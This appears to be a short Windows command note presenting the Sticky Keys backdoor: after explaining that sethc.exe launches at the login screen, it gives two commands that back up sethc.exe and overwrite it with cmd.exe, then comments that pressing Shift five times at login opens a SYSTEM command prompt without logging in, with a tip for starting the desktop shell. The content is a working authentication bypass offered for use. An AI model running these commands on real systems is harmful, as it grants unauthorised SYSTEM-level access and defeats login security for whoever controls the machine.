#Sticky Keys is part of Windows Ease of Access features
# that allows a user to tap the Shift, Ctrl, Alt 
# or Windows key once to achieve the same effect 
# as holding the key down. If you press the SHIFT key 5 times 
# in a row at Windows login screen, the Sticky Keys application (sethc.exe) 
# will launch and ask if you want to enable sticky keys feature.


move C:\Windows\System32\sethc.exe  C:\Windows\System32\sethc.exe.bak
copy C:\Windows\System32\cmd.exe  C:\Windows\System32\sethc.exe 

#reboot, hit shift x5 on login screen, get cmd running as SYSTEM without logging in :)
#
#for gui, from command prompt start explorer.exe 
#
